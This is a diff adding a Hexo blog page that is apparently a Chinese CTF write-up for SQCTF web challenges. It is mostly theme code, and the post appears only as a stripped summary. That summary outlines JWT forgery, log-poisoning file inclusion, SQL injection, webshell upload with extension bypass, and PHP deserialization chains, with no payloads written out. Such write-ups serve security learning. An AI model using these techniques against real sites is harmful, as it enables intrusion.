@@ -1,0 +1,794 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛 | FLYFISHING</title><meta name="keywords" content="WP"><meta name="author" content="FLYFISH"><meta name="copyright" content="FLYFISH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"><meta name="application-name" content="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛"><meta property="og:url" content="https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/index.html"><meta property="og:site_name" content="FLYFISHING"><meta property="og:description" content="RceMe（未完成）ezGame思路:这题本来只是单纯的想玩一下游戏，失败的时候自动跳flag了，然后才到源码里仔细看 当游戏结束时，弹出提示框告知玩家游戏结束，然后向服务器发送一个包含当前游戏得分的 GET 请求，请求服务器端的 flag.php 脚本，最后将服务器返回的响应文本以警告框的形式显示"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg?_r_=9d49968b-f17c-2e1f-2bc2-9968c0b4b0e4"><meta property="article:author" content="FLYFISH"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg?_r_=9d49968b-f17c-2e1f-2bc2-9968c0b4b0e4"><meta name="description" content="RceMe（未完成）ezGame思路:这题本来只是单纯的想玩一下游戏，失败的时候自动跳flag了，然后才到源码里仔细看 当游戏结束时，弹出提示框告知玩家游戏结束，然后向服务器发送一个包含当前游戏得分的 GET 请求，请求服务器端的 flag.php 脚本，最后将服务器返回的响应文本以警告框的形式显示"><link rel="shortcut icon" href="https://img.icons8.com/?size=100&id=35cCJ0NU5XUV&format=png&color=000000"><link rel="canonical" href="https://flyfish567.github.io/article/%E5%AD%A6%E4%B9%A0study/WP/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"笨蛋宝宝，还不睡，我要生气啦","startTime":0,"endTime":5},{"greeting":"宝宝早上好鸭👋, 今天也要开心哦！","startTime":6,"endTime":9},{"greeting":"宝宝上午好👋,mua～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下宝宝就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝宝","startTime":12,"endTime":14},{"greeting":"宝宝，🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励宝宝一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"宝宝晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":22},{"greeting":"要睡觉咯宝宝，不许玩游戏啦(•́へ•́╬)","startTime":22,"endTime":23},{"greeting":"不许熬夜坏宝宝，快去睡觉啦","startTime":22,"endTime":24}]},
+  twikooEnvId: 'cloud1-9g53mppfbcb1cd04',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 期待环球旅游者","🏠 梦想小屋幻想者","🔨 CTF爱好者"]},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: FLYFISH","link":"链接: ","source":"来源: FLYFISHING","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'FLYFISHING',
+  title: 'sqctf-web  商丘师范学院第四届网络安全及信息对抗大赛',
+  postAI: '',
+  pageFillDescription: 'RceMe（未完成）, ezGame, 思路, 伪装（未修改）, Ping（未完成）, Are you from SQNU?（未完成）, Through, Look for the homepage, 商师一日游, 第一关, 第二关, 第三关, 为什么用curl -V？, 第四关, 第五关, 第六关, 小小查询系统, baby_include, 漏洞分析, 思路, 绕过原理, 绕过方案, input a number, 漏洞分析, 绕过方法, Ez_calculate, 思路, My Blog, 哎呀大大大黑塔, 思路：, 解法：, 唯一, 思路, 解法：, Upload_Level1, Upload_Level2, baby rce, 思路, 函数基本功能, 代码示例分析, 解法：, 白月光, 无参之舞（没写出来）, eeaassyy, 思路：, 逃, 漏洞分析, 绕过方案, 嘿嘿嘿, 漏洞分析, 攻击链构造, 绕过原理未完成思路这题本来只是单纯的想玩一下游戏失败的时候自动跳了然后才到源码里仔细看当游戏结束时弹出提示框告知玩家游戏结束然后向服务器发送一个包含当前游戏得分的请求请求服务器端的脚本最后将服务器返回的响应文本以警告框的形式显示给玩家调用对象的方法来判断游戏是否结束若该方法返回则表示游戏结束会执行大括号内的代码若返回则不执行游戏失败当游戏结束时弹出一个警告框显示这样的提示信息告知玩家游戏已结束调用对象的方法该方法用于向服务器发送请求以获取游戏标志但是这里我们不知道的内容是什么所以访问一下发现直接提示了分数不足达到分即可活动所以玩到就可以了好吧又尝试了一下没到也会有提示前端改不行伪装未修改代码分析核心路由逻辑路由强制覆盖设置普通用户权限直接泄露源代码暴露暴露密钥访问会返回源码导致泄露覆盖每次访问会重置为普通用户应避免在此阶段操作路由权限校验目标只有能触发返回攻击思路利用伪造漏洞密钥泄露通过访问得知构造恶意生成包含的合法绕过权限检查携带伪造的访问触发逻辑未完成未完成这里因为题目刷的不多第一遍写的时候没有想起来是什么知识点第二次写注意到题目目录遍历才反应过来然后就用一把梭了绕过利用条件设置参数其他参数和可为任意值绕过构造参数和参数使得等于例如选择其为设置商师一日游商师好好看比我破大专好多了第一关提示直接直接看源码苦苦找寻在附近的草丛中发现的你的令牌你成功进入校园旅行碎片第二关打开你的终端构造一块牌的曲奇饼上面刻下字样便可获得强筋壮骨牌鱼食曲奇曲奇根据提示查看发现里面的改成就可以了旅行碎片你继续前进第三关提示进入终端在中找到复活币这里刚开始在源码和里找找错了是什么刚开始不知道所以这里问了刚刚搜了发现是开发工具为什么用以下是的理由复活币是服务器返回的隐藏数据而非页面可见内容它可能存在于响应头如等自定义头注释开发者工具中可见但页面不渲染文件代码中硬编码的字符串网络请求的元数据如重定向路径操作路径的逻辑根据提示的指引解题流程应为打开开发者工具定位网络请求分析请求响应提取复活币这里在和还有都找过了没有内容所以才选择在响应中寻找的模式会显示完整的交互过程包括请求头可确认是否携带了必要的参数或响应头直接暴露服务器返回的元数据如复活币的位置调试信息例如重定向路径认证失败提示等所以使用命令回显下一关第四关借由终端找到从而获得超强拿到纸条姜萍这里根据提示查看文件就行第五关正则大概吧第一层校验修饰符多行模式使和匹配字符串中每一行的开头和结尾而非整个字符串的开头和结尾修饰符忽略大小写匹配时不区分大小写如均符合条件如果输入字符串中存在至少一行完全等于不区分大小写那么进入下一层判断否则结束第二层校验无修饰符和仅匹配整个字符串的开头和结尾修饰符仍生效忽略大小写条件如果整个输入字符串严格等于不区分大小写且无额外字符或换行那么输出否则输出绕过思路根据上面的分析我们需要第一个判断返回第二个判断返回可以用换行符的编码任意内容满足获得输出的条件换行符注入换行直接写入多行组合第二行匹配我这里选了第一种获得回显成功消灭逸散漏洞旅行碎片你继续前进第六关我怎么不点不让我点所以只要点击按钮就可以了根据网页基础知识可以去掉这里的就可以按按钮了验证成功欢迎来到隐藏关卡继续前进点击这里别忘了收集旅行碎片第七关恭喜恭喜这里直接查看就行考的是命令执行直接看目录再检查就行结束啦恭喜恭喜其他题目不会写了先这样吧小小查询系统学了许久的注入终于碰到了发现可以正常联合查询那就联合查询单引号闭合这里有点思维惯性了认为一定在当前库下面所以一直查下去发现没有以为是自己搞错了后来反应过来可能在其他库下面成功找到了库名列名但是这里在查询数据的时候显示库不存在思索许久选择了询问恩师才了解到数据库查询数据是从当前数据库查的如果当前数据库没有查询的表那么就会回显不存在库所以最后查询是这题又学到了知识点这题参考了漏洞分析漏洞类型本地文件包含题目代码中存在操作且参数未严格限制协议和路径导致可读取任意本地文件过滤不严仅对等关键词进行替换未禁用协议或彻底限制文件范围漏洞触发点直接包含用户输入的参数用户通过可控制包含的文件路径若包含的文件中存在代码如日志文件会被解析执行过滤规则缺陷替换关键词为仅替换部分协议关键词未禁用协议未对文件路径做白名单限制如仅允许包含特定目录思路核心逻辑目标读取文件限制无法直接使用或协议读取文件源码替代方案利用日志文件通过协议包含服务器日志文件如的污染日志注入代码到日志中使其成为可执行的恶意文件攻击步骤污染日志发送携带恶意的请求将代码写入日志触发执行通过包含日志文件触发代码执行读取绕过原理绕过协议过滤过滤规则被替换为可用协议未被过滤可直接使用关键操作目标日志文件作为代码载体日志记录机制服务器会将请求头信息如记录到日志文件中代码注入通过注入代码目标日志污染结果日志中会包含一行如下内容时间戳代码执行当通过包含日志文件时其中的代码会被解析执行路径猜测依据日志路径默认日志路径默认日志路径题目通常使用默认路径路径根目录惯例常见文件名绕过方案完整攻击流程步骤污染日志注入代码步骤触发文件包含执行日志中的代码此题目参考了将变量转为整数对于字符串会尝试提取开头的数字部分忽略非数字字符对于浮点数直接取整数部分向下取整对于其他类型如数组对象返回或会报错漏洞分析的进制解析当的第二个参数为时会根据字符串格式自动判断进制以开头解析为八进制如以开头解析为十六进制如其他情况解析为十进制松散比较不同类型比较时会尝试强制转换例如字符串会被转换为数字绕过方法传递一个值使得原始值不等于避免触发转换后等于方法科学计数法传入会将视为浮点数松散比较触发失败方法十六进制或八进制传入十六进制或八进制两者十进制均为导致直接触发失败方法浮点数末尾非零传入松散比较不触发转换截断小数部分满足条件思路这个之前碰到过当时前端改了没有效果所以这题惯性思维直接脚本跑了用改了一下之前的代码结果返回了这个路径所以可以扫目录统一清洗操作处理特殊符号和空格获取题目页面查找数学表达式优化正则表达式移除所有空格确保匹配成功率错误无法识别数学表达式网页内容片段原始表达式字符串处理并计算计算完成计算表达式失败提交答案确保提交字符串格式提取安全方式成功获取未找到可能原因答案计算错误页面结构改变服务器限制如频率服务器返回内容片段什么都没有就找到一个登录账号密码刚开始以为是注入结果没有办法输进去之后感觉如果有登录账号密码就一定有登录页面于是选择了扫一遍结果刚好出来了再用找到的账号密码登录哎呀大大大黑塔思路看了好几遍里的数字尝试了好几遍还是看到群里好兄弟提示说不在但是是视频尝试了日期评论区等最后号成功了进去之后是反序列化目标条件反序列化后的对象需满足触发方法时会包含并输出解法如下编码后唯一思路这题刚开始没什么思路找了半天没想法我的笔记冒号之后的内容没有办法显示所以卡在这然后也是和交流了一下返回可以在笔记内容有输入尝试了一下确实可以正常回显了不过还是不能进行注入那就试试回显说明可以那就一把梭解法恰好之前看过再加上提示了马所以就想到了文件上传一句话木马不过这里限制了上传不能是只能是所以先改成后缀再用抓包改成发送就可以用蚁剑连接了这题感觉比还简单因为写了所以就先上传了后缀再用抓包改成后缀成功上传用蚁剑就可以了思路是绕过然后就调用函数了学习了一下函数大概就是把输入的内容作为函数运行等同于函数基本功能是中的一个内置函数用于动态调用用户自定义的函数或方法其基本语法为参数要调用的函数名字符串或方法数组如可选参数传递给被调用函数的参数代码示例分析用户提供的代码片段行为解析从请求中获取名为的参数值将该值直接作为函数名调用例如用户提交执行用户提交执行为什么用而不是用于实例化对象的非静态方法调用调用对象实例的非静态方法用于直接调用类的静态方法无需创建对象实例更简洁且适合攻击场景解法发送请求绕过响应会返回发送请求触发白月光刚开始以为是注入尝试许久没有反应再尝试了发现回显那就是了直接一把梭了无参之舞没写出来思路乐分数低自然是不难刚开始点进去一片空白想看源代码但是右键和都被禁止了那就用然后就出来了逃逃出来了恭喜恭喜漏洞分析过滤规则函数会将和替换为目标条件反序列化后对象的属性值需为类结构绕过方案步骤生成基础生成一个类的序列化字符串将设为输出步骤绕过属性名过滤由于只替换值中的关键字不影响属性名直接使用原始即可最终直接将生成的序列化字符串作为参数传递执行效果服务端反序列化后对象属性满足条件输出嘿嘿嘿漏洞分析关键代码段反序列化入口限制条件不能是数组且不等于的限制条件不能包含协议目标触发条件必须为直接输出核心矛盾点表面条件需要满足深层限制必须绕过两个过滤条件不能是数组防止通过数组绕过检测值不能等于即的字符串值不能是不能包含协议防止直接使用协议流读取文件攻击链构造步骤构建魔术方法链创建对象用于读取内容目标文件允许读取创建对象触发的调用时触发创建对象设置属性为对象反序列化时触发链满足核心条件步骤序列化生成的序列化字符串绕过原理动态计算绕过触发时机当执行时是对象触发是对象触发对象读取内容返回文件内容字符串实际计算值文件内容绕过条件文件内容必然成立协议过滤绕过不使用协议流直接通过类读取文件路径文件存在检测在中触发但此处通过魔术方法链已绕过精确条件满足属性直接设置为触发核心逻辑直接输出攻击流程发送直接发送以下数据编码后服务端执行流程反序列化触发对象构造检查时触发魔术方法链实际计算内容的满足所有过滤条件后执行输出关键验证点为什么不能直接用无法触发魔术方法链属性只能是静态字符串若设置会触发过滤设置其他值则无法读取为什么需要三层类嵌套提供反序列化入口桥接调用实现最终文件读取操作',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-03-24 14:11:27',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://flyfish567.github.io/" title="博客"><img class="back-menu-item-icon" src="https://img.icons8.com/?size=100&amp;id=35cCJ0NU5XUV&amp;format=png&amp;color=000000" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://t.bilibili.com" title="Bilibili"><img class="back-menu-item-icon" src="https://img.icons8.com/?size=100&amp;id=5E24fZ9ORelo&amp;format=png&amp;color=000000" alt="Bilibili"/><span class="back-menu-item-text">Bilibili</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.nssctf.cn/contest" title="NSSCTF"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="NSSCTF"/><span class="back-menu-item-text">NSSCTF</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://chat.deepseek.com/" title="Deepseek"><img class="back-menu-item-icon" src="https://img.icons8.com/?size=100&amp;id=YWOidjGxCpFW&amp;format=png&amp;color=000000" alt="Deepseek"/><span class="back-menu-item-text">Deepseek</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">FLYFISHING</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 警示页</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/Warning/index.html"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 警告</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=12908278323&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1c786423c6fa1d079ed90fd1b63b592.jpg" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1c786423c6fa1d079ed90fd1b63b592.jpg"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img39a034a7638e67c31e4ac65e322d028.jpg" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img39a034a7638e67c31e4ac65e322d028.jpg"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/WP/" style="font-size: 1.05rem;">WP<sup>2</sup></a><a href="/tags/test/" style="font-size: 1.05rem;">test<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0study/" 